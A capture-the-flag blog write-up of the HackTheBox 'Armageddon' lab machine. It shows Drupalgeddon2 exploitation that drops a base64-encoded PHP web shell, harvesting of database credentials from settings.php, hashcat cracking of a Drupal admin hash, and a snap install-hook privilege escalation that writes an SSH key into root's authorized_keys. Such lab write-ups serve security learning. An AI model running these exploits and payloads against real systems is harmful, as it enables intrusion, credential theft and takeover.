---
layout: post
title:  "HackTheBox: Armageddon"
date:   2022-01-12 10:00:00 +1000
categories: red-team
tags: drupal rce hashcat snap
excerpt_separator: <!--more-->
---

**Armageddon** is a Linux-based machine authored by *bertolis*, with an average rating of 3.9 stars.

<!--more-->

<p align="center"><img src="/assets/images/armageddon/main.png" /></p>

### // Recon
```
nmap -A armageddon.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-12 10:16 AEST
Nmap scan report for armageddon.htb (10.10.10.233)
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon
|_http-generator: Drupal 7 (http://drupal.org)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
```

The server is running ssh & http, which is typical for a lot of HTB boxes. Interestingly we can already see that the web server is using PHP 5 and Drupal 7, both of which are several major versions old. Accessing the machine via a web browser gives us a fairly typical, CMS-style login page:

<p align="center"><img src="/assets/images/armageddon/1.png" /></p>

We can browse around the site and visit several pages, including a user registration page that facilitates account creation. Unfortunately trying to use the page reveals that its broken - and our password can't be emailed to us - so even if we do create an account, we can't login.

### // Initial Foothold
Nmap also revealed the presence of a `robots.txt` file, which is always a great place to look for additional interesting content. Included in the list is a `CHANGELOG.txt` file, which helpfully confirms for us on the first line that the specific version of Drupal running is `7.56`

Searching for exploits / CVEs for for PHP 5.4.16 doesn't turn up much interesting, but searching for Drupal 7.56 returns a lot of hits for *Drupalgeddon*, an RCE exploit that exists in a number of Drupal versions, including `7.56`. Ready-made exploits exist in both [python](https://www.exploit-db.com/exploits/44449) and [ruby](https://github.com/dreadlocked/Drupalgeddon2), so I decided to try the ruby version for something different:

```
ruby drupalgeddon2.rb http://armageddon.htb
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://armageddon.htb/
--------------------------------------------------------------------------------
[+] Found  : http://armageddon.htb/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.56
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Clean URLs
[!] Result : Clean URLs disabled (HTTP Response: 404)
[i] Isn't an issue for Drupal v7.x
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo HKALZBDY
[+] Result : HKALZBDY
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://armageddon.htb/shell.php)
[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[i] Fake PHP shell:   curl 'http://armageddon.htb/shell.php' -d 'c=hostname'
armageddon.htb>> id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

With very little effort, we have a shell on the box as the *apache* user.

### // User-Flag
The apache user typically has limited privileges on a server, and this machine is no exception. We are able to view the `/etc/passwd` file, which among the regular entries also reveals an interestingly named account:
```
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

Typical enumeration at this point would involve uploading [linPEAS](https://github.com/carlospolop/PEASS-ng) to the server, but our account doesn't even have the necessary permissions to run `curl` and pull down a file. The filesystem also looks to be heavily locked-down, with most files and folders owned by root. With not much more to go on, we're left to browse the site's files looking for additional vectors, which we can do by searching for some common useful strings:
```
fgrep -ri 'username' ./*
fgrep -ri 'password' ./*
```

Eventually we discover that `./sites/default/settings.php` contains the database credentials for `drupaluser`. Let's see if we can login to the database through our ruby shell:
```
armageddon.htb>> mysql -udrupaluser -pCQHEy@9M*m23gBVj -h localhost drupal

armageddon.htb>>
```

There's no error returned, but it still doesn't seem to work. This is likely because our user doesn't have a shell defined in `/etc/passwd`, which prevents it from running the mysql client correctly. We can, however, still execute queries by supplying them as an argument:
```
armageddon.htb>> mysql -udrupaluser -pCQHEy@9M*m23gBVj -h localhost drupal -e 'show tables'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
...
```

Included in the list of available tables is `users`, so let's grab the rows from that:
```
armageddon.htb>> mysql -udrupaluser -pCQHEy@9M*m23gBVj -h localhost drupal -NB -e 'select * from users'
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1642027982	1642027982	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
armageddon.htb>>
```

Again we see the user `brucetherealadmin`, and what looks to be a hashed password. Some quick Google searching reveals that Drupal 7 uses salted SHA512 hashing. If we want to attempt to crack the hash, we should first use [hashid](https://www.kali.org/tools/hashid/) in Kali Linux to identify which mode to run:
```
┌──(kali㉿kali)-[~]
└─$ hashid -m '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'                           
Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
[+] Drupal > v7.x [Hashcat Mode: 7900]
```

We can now run [hashcat](https://hashcat.net/hashcat/) against the hash, using the ubiquitous *rockyou.txt* wordlist:
```
┌──(kali㉿kali)-[~]
└─$ echo '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' >> brucetherealadmin

┌──(kali㉿kali)-[~]
└─$ hashcat --force -m 7900 -a 0 -o cracked.txt brucetherealadmin /usr/share/wordlists/rockyou.txt    
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i9-8950HK CPU @ 2.90GHz, 1398/1462 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit
* (null)

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Drupal7
Hash.Target......: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
Time.Started.....: Tue Jan 11 22:45:49 2022, (2 secs)
Time.Estimated...: Tue Jan 11 22:45:51 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      250 H/s (11.23ms) @ Accel:128 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 512/14344385 (0.00%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:32512-32768
Candidates.#1....: 123456 -> letmein

Started: Tue Jan 11 22:44:53 2022
Stopped: Tue Jan 11 22:45:53 2022

┌──(kali㉿kali)-[~]
└─$ cat cracked.txt      
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```

Given the proensity of users to re-use passwords across accounts & services, it makes sense to try this login against the ssh service identified in the inital recon:
```
ssh brucetherealadmin@armageddon.htb
brucetherealadmin@armageddon.htb's password:
Last login: Wed Jan 12 22:45:39 2022 from 10.10.14.23
[brucetherealadmin@armageddon ~]$ 
```

We then find the user flag in the usual location:
```
[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$ cat user.txt
6a******************************
```

## // Privilege Escalation
Now that we have a user with a real shell, it's straightforward to pull down linPEAS for complete enumeration. One of the more interesting things revealed is this sudo entry:
```
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

[Snap](https://snapcraft.io/) is a Linux-based application installer, that allows apps in various languages (Python, Go, Java etc.) to be packaged up for easy installation. [GTFOBins](https://gtfobins.github.io/gtfobins/snap/) indicates this is also a viable way to achieve privilege escalation, for example by using a bash script:
```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```

If we run the code as specified, upload the built snap file and run it on the server, we can see that we're able to run any code we want as root:
```
[brucetherealadmin@armageddon ~]$ sudo snap install /tmp/armageddon_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "armageddon" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)
```

From here, we can building a new snap that, for example, puts our ssh key into the `/root/.ssh/authorized_keys` file:
```
#!/bin/sh
mkdir /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAZtReoSW8F...' >> /root/.ssh/authorized_keys; false
```

And if we upload that and install it via snap:
```
[brucetherealadmin@armageddon ~]$ sudo snap install /tmp/armageddon-root-ssh_1.0_all.snap --dangerous --devmode
error: cannot perform the following tasks:
- Run install hook of "armageddon-root-ssh" snap if present (run hook "install": exit status 1)
```

We can ssh in as root with no password, and access the root flag at the expected location:
```
ssh root@armageddon.htb
Last login: Tue Mar 23 12:58:10 2021
[root@armageddon ~]# ls
anaconda-ks.cfg  cleanup.sh  passwd  reset.sh  root.txt  snap
[root@armageddon ~]# cat root.txt
e6e*****************************
```

<p align="center"><img src="/assets/images/armageddon/2.png" /></p>